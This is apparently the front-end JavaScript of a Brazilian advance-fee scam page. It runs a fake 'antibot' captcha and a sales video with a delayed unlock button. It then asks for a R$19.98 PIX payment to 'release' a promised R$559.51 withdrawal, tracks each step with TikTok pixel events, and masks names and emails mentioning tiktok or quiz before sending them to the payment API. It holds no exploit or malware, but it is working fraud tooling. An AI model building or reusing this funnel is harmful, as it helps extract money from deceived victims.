// Setup event listeners for registration page - Antibot Oficial Netlify
window.__antibotExpected = null;

window.iniciarCaptchaAntibot = function() {
  const welcome = document.getElementById('welcomeStep');
  const captcha = document.getElementById('captchaStep');
  if (welcome) welcome.classList.add('hidden');
  if (captcha) captcha.classList.add('active');
  
  const a = Math.floor(Math.random() * 8) + 2;
  const b = Math.floor(Math.random() * 8) + 1;
  window.__antibotExpected = a + b;
  
  const qEl = document.getElementById('captchaQuestion');
  if (qEl) qEl.textContent = `Quanto é ${a} + ${b}?`;
  
  const input = document.getElementById('captchaInput');
  if (input) {
    input.value = '';
    input.classList.remove('error');
    setTimeout(() => input.focus(), 150);
  }
  const err = document.getElementById('errorMsg');
  if (err) err.style.display = 'none';
};

window.verificarCaptchaAntibot = function() {
  const input = document.getElementById('captchaInput');
  const err = document.getElementById('errorMsg');
  if (!input) return;

  const val = parseInt(input.value.trim(), 10);
  if (val === window.__antibotExpected) {
    const overlay = document.getElementById('popupOverlay');
    const main = document.getElementById('antibotMainContent');
    const confirmScreen = document.getElementById('confirmationScreen');

    if (overlay) overlay.classList.remove('active');
    if (main) main.style.display = 'none';
    if (confirmScreen) confirmScreen.classList.add('active');

    if (window.ttq && typeof window.ttq.track === 'function') {
      try { window.ttq.track('CompleteVerification'); } catch(e) {}
    }

    try { sessionStorage.setItem('__SKIP_PRESELLS', '1'); } catch (e) {}
    try { document.cookie = 'p2skip=1; path=/; max-age=3600; SameSite=Lax'; } catch (e) {}

    setTimeout(() => {
      window.location.href = '/confirmar-saque-quiz' + (window.location.search || '');
    }, 1200);
  } else {
    input.classList.add('error');
    if (err) err.style.display = 'block';
    input.value = '';
    setTimeout(() => {
      input.classList.remove('error');
      if (err) err.style.display = 'none';
      window.iniciarCaptchaAntibot();
    }, 1600);
  }
};

window.voltarAoWelcome = function() {
  const welcome = document.getElementById('welcomeStep');
  const captcha = document.getElementById('captchaStep');
  if (welcome) welcome.classList.remove('hidden');
  if (captcha) captcha.classList.remove('active');
};

window.voltarAoSaque = function() {
  if (typeof showPage === 'function') {
    showPage('withdraw');
  }
};

window.abrirPoliticaAntibot = function(type) {
  const modal = document.getElementById(type === 'privacy' ? 'privacyModal' : 'termsModal');
  if (modal) modal.classList.add('active');
};

window.fecharPoliticaAntibot = function(type) {
  const modal = document.getElementById(type === 'privacy' ? 'privacyModal' : 'termsModal');
  if (modal) modal.classList.remove('active');
};

function setupRegistrationPage() {
  const input = document.getElementById('captchaInput');
  if (input) {
    input.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        window.verificarCaptchaAntibot();
      }
    });
  }
}

// Funções Globais Oficiais da SyncPayments
window.iniciarPagamentoSyncPay = async function(btnClicked) {
  const btn = btnClicked || document.getElementById('confirmation-button');
  const originalText = btn ? btn.textContent : '';
  if (btn) {
    btn.disabled = true;
    btn.textContent = 'Gerando PIX...';
  }

  if (window.ttq) {
    try {
      window.ttq.track('InitiateCheckout', { value: 19.98, currency: 'BRL' });
      window.ttq.track('ClickButton', { value: 19.98, currency: 'BRL' });
    } catch(e) {}
  }

  let userData = {};
  try {
    userData = JSON.parse(localStorage.getItem('userPixData') || '{}');
  } catch(e) {}

  try {
    const res = await fetch('/api/gerar-pix', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: (userData.nome && !/tiktok|quiz|iof|recompensas/i.test(userData.nome)) ? userData.nome : 'Cliente Consumidor',
        cpf: (userData.tipo === 'cpf' && userData.chave) ? userData.chave : '',
        email: (userData.tipo === 'email' && userData.chave && !/tiktok/i.test(userData.chave)) ? userData.chave : 'atendimento@sac-lojavirtual.com',
        amount: 19.98
      })
    });

    const data = await res.json();
    if (data && data.pix_code) {
      window.abrirModalSyncPay(data.pix_code);
    } else {
      alert('Erro ao gerar código PIX. Tente novamente em alguns segundos.');
    }
  } catch (err) {
    console.error(err);
    alert('Erro na conexão com o gateway. Verifique sua conexão.');
  } finally {
    if (btn) {
      btn.disabled = false;
      btn.textContent = originalText || 'Pagar R$ 19,98 e Liberar Saque de R$ 559,51';
    }
  }
};

window.abrirModalSyncPay = function(pixCode) {
  const modal = document.getElementById('pix-modal-syncpay');
  const input = document.getElementById('syncpay-code-input');
  const qrImg = document.getElementById('syncpay-qrcode-img');
  if (!modal || !input || !qrImg) return;

  input.value = pixCode;
  qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode);
  modal.style.display = 'flex';

  let segundos = 15 * 60;
  const timerEl = document.getElementById('syncpay-expire-timer');
  if (window.__syncpayTimer) clearInterval(window.__syncpayTimer);
  window.__syncpayTimer = setInterval(() => {
    if (segundos <= 0) {
      clearInterval(window.__syncpayTimer);
      if (timerEl) timerEl.textContent = 'Expirado';
      return;
    }
    segundos--;
    const m = String(Math.floor(segundos / 60)).padStart(2, '0');
    const s = String(segundos % 60).padStart(2, '0');
    if (timerEl) timerEl.textContent = m + ':' + s;
  }, 1000);
};

window.fecharModalSyncPay = function() {
  const modal = document.getElementById('pix-modal-syncpay');
  if (modal) modal.style.display = 'none';
  if (window.__syncpayTimer) clearInterval(window.__syncpayTimer);
};

window.copiarPixSyncPay = function() {
  const input = document.getElementById('syncpay-code-input');
  const btnText = document.getElementById('btn-copiar-text');
  if (!input) return;

  input.select();
  input.setSelectionRange(0, 99999);
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(input.value).then(() => {
      if (btnText) btnText.textContent = 'Copiado!';
      if (navigator.vibrate) navigator.vibrate(30);
      setTimeout(() => {
        if (btnText) btnText.textContent = 'Copiar';
      }, 3000);
    }).catch(() => {
      document.execCommand('copy');
      if (btnText) btnText.textContent = 'Copiado!';
      setTimeout(() => {
        if (btnText) btnText.textContent = 'Copiar';
      }, 3000);
    });
  } else {
    document.execCommand('copy');
    if (btnText) btnText.textContent = 'Copiado!';
    setTimeout(() => {
      if (btnText) btnText.textContent = 'Copiar';
    }, 3000);
  }
};

// Setup event listeners for video page - Delay inteligente de alta conversão (meio do vídeo ou ao acabar)
function setupVideoPage() {
  const container = document.getElementById('unlockContainer');
  const btn = document.getElementById('unlockBtn') || document.querySelector('.unlock-btn');
  const video = document.getElementById('vslVideoQuiz') || document.querySelector('.video-container video');

  function revelarBotaoDesbloquear() {
    if (!container || container.dataset.revealed === 'true') return;
    container.dataset.revealed = 'true';
    container.style.display = 'block';
    // Força reflow para transição suave
    void container.offsetWidth;
    container.style.opacity = '1';
    container.style.transform = 'translateY(0)';
    try { sessionStorage.setItem('vsl_unlocked', 'true'); } catch(e) {}
  }

  // Se já assistiu antes na mesma sessão, libera direto
  try {
    if (sessionStorage.getItem('vsl_unlocked') === 'true') {
      revelarBotaoDesbloquear();
    }
  } catch(e) {}

  if (video) {
    // Dispara no meio do vídeo (~35s ou 50% da duração)
    video.addEventListener('timeupdate', function() {
      const targetTime = (video.duration && !isNaN(video.duration) && video.duration > 0)
        ? (video.duration / 2)
        : 35;
      if (video.currentTime >= targetTime) {
        revelarBotaoDesbloquear();
      }
    });

    // Dispara imediatamente se o vídeo chegar ao fim
    video.addEventListener('ended', function() {
      revelarBotaoDesbloquear();
    });
  }

  // Fallback de resiliência: se o lead não der play ou o codec travar, libera aos 35s
  setTimeout(function() {
    revelarBotaoDesbloquear();
  }, 35000);

  if (btn) {
    btn.onclick = function(e) {
      if (e) e.preventDefault();
      window.location.href = '/confirmar-saque-quiz' + (window.location.search || '');
    };
  }
}

// Delegação global redundante para garantir que NENHUM clique em Realizar Saque ou Pagar falhe
document.addEventListener('click', function(e) {
  const target = e.target.closest('#btn-realizar-saque-withdraw, .btn-sacar-dinheiro-ds, #unlockBtn, .unlock-btn, #confirmation-button, .confirmation-cta-button');
  if (target) {
    if (target.id === 'unlockBtn' || target.classList.contains('unlock-btn')) {
      if (e) e.preventDefault();
      window.location.href = '/confirmar-saque-quiz' + (window.location.search || '');
    } else if (target.id === 'btn-realizar-saque-withdraw' || target.classList.contains('btn-sacar-dinheiro-ds') || target.innerText.includes('Sacar dinheiro') || target.innerText.includes('Realizar Saque')) {
      window.executarAcaoSaque(e);
    }
  }
});